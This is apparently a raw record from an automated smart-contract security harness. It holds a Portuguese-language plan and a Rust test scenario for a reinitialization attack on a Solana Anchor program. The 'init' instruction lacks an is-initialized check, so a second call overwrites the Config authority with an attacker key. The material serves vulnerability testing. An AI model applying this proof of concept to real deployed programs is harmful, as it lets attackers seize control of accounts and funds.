attempts.raw:
{
  "plan": "O programa-alvo possui uma instrucao `init` que escreve em uma conta `Config` sem verificar se ela ja foi inicializada (nao ha constraint `init` nem checagem de `is_initialized`). O baseline chama `init` legitimamente com uma conta Config recem-criada (empty_account) e um authority signer, provando que o cenario esta correto. O ataque reutiliza a mesma instrucao `init` sobre a conta Config ja inicializada pelo baseline (com authority diferente), tentando sobrescrever o estado. O efeito medido e que o campo `authority` da conta Config apos o ataque difere do authority original gravado pelo baseline, demonstrando a reinicializacao.",
  "scenario": "let authority_legit = Pubkey::new_unique();
let authority_attacker = Pubkey::new_unique();

let config_key = Pubkey::new_unique();

let metas_legit = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_legit, true),
];
let ix_legit = env.anchor_ix("init", &(), metas_legit);

let contas_legit = vec![
    (config_key, empty_account()),
    (authority_legit, wallet(1_000_000_000)),
];

let r_base = env.baseline("init legitimo em conta nova", &ix_legit, &contas_legit);

let config_pos_base = after(&r_base, &config_key).clone();
let authority_pos_base = read_pubkey(config_pos_base.data(), 8);

let metas_ataque = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_attacker, true),
];
let ix_ataque = env.anchor_ix("init", &(), metas_ataque);

let contas_ataque = vec![
    (config_key, config_pos_base.clone()),
    (authority_attacker, wallet(1_000_000_000)),
];

let r = env.attack("reinit: chamar init novamente sobre Config ja inicializada", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let authority_pos_ataque = read_pubkey(after(&r, &config_key).data(), 8);
    env.effect(
        "authority da Config foi sobrescrito pelo atacante (reinit bem-sucedido)",
        authority_pos_ataque == authority_attacker && authority_pos_ataque != authority_pos_base,
    );
}"
}

